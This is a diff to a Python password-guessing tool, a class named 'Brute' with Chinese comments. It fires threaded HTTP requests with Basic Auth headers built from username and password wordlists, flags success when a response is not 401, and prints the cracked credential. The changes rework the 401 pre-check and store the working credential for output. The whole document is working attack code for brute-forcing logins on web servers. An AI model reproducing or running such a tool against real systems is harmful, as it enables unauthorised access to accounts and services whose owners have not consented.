@@ -30,20 +30,23 @@ class Brute:
         self.threadNum = thread
         self.isSucceed = 0
         self.nowPair = ""
+        self.realPwd = None
         # TODO 从setting.py中解析以下配置项目
         self.reqMethod = reqMethod.GET
         self.timeout = 5
         self.SSL_veirfy = False
-
         # TODO 加载setting.py
         DEFAULT_HEADERS = {}
 
-    def preloadBasic(self):
+
+    def getBaseCode(self):
         try:
             resp = requests.get(self.url, timeout=self.timeout, verify=self.SSL_veirfy)
-            if 401 == resp.status_code:
-                return True
-            print("[!]Target may not using Basic Auth, status_code:(%s)" % resp.status_code)
+            if  (resp.status_code is not None):
+                return resp.status_code
+            else:
+                # print("[!]Target may not using Basic Auth, status_code:(%s)" % resp.status_code)
+                return False
         except Exception as e:
             print("[!]req error, Target may be down:(%s)" % e)
         return False
@@ -85,23 +88,6 @@ class Brute:
         else:
             print("username or password CANNOT be Null")
 
-    # def yieldB64(self):
-    #     '''编码Basic Auth用到的账号密码. 每次返回一个HTTPBasicAuth对象, 供requests的auth参数使用
-    #     :str usr:用户名
-    #     :List pwd: 密码
-    #     :return: yield HTTPBasicAuth(usr, pwd)
-    #     '''
-    #     # 生成器
-    #     if (self.userList and self.pwdList):
-    #         for usr in self.userList:
-    #             for pwd in self.pwdList:
-    #                 usr = str(usr).strip()
-    #                 pwd = str(pwd).strip()
-    #                 src = "%s:%s" % (usr, pwd)
-    #                 yield base64.b64encode(src.encode()).decode()
-    #     else:
-    #         print("username or password CANNOT be Null")
-
 
     def req(self, auth):
         '''将Basic认证头添加到HTTP请求头中, 并返回一个reponse对象
@@ -120,13 +106,15 @@ class Brute:
                 # 中断标记。若爆破成功，停止爆破
                 if 401 != resp.status_code:
                     self.isSucceed = 1
+                    # TODO 将usr/pwd的组装放入req中进行，以免无法还原usr/pwd串
+                    self.realPwd = auth
 
             except Exception as e:
                 #TODO log it
                 print("[-]request error, reason: %s" % e)
         else:
             # 爆破成功，打印结果
-            print("[+]Good, Result is: %s" % self.nowPair)
+            print("[+]Good, Result is: %s" % self.realPwd)
 
 
     def run(self):
@@ -135,8 +123,12 @@ class Brute:
         :return:
         '''
         # 预检查，页面状态码是否为401
-        if False == self.preloadBasic():
+        if False == self.getBaseCode():
             exit()
+        elif 401 != self.getBaseCode():
+            print("[!]Target may not using Basic Auth, status_code:(%s)" % self.getBaseCode())
+        else:
+            print("[-]Target is using Basic Auth")
         # 加载字典, 并完成生成器的初始化
         self.userList, self.pwdList = self.loadDic()
         pool = Pool(self.threadNum)
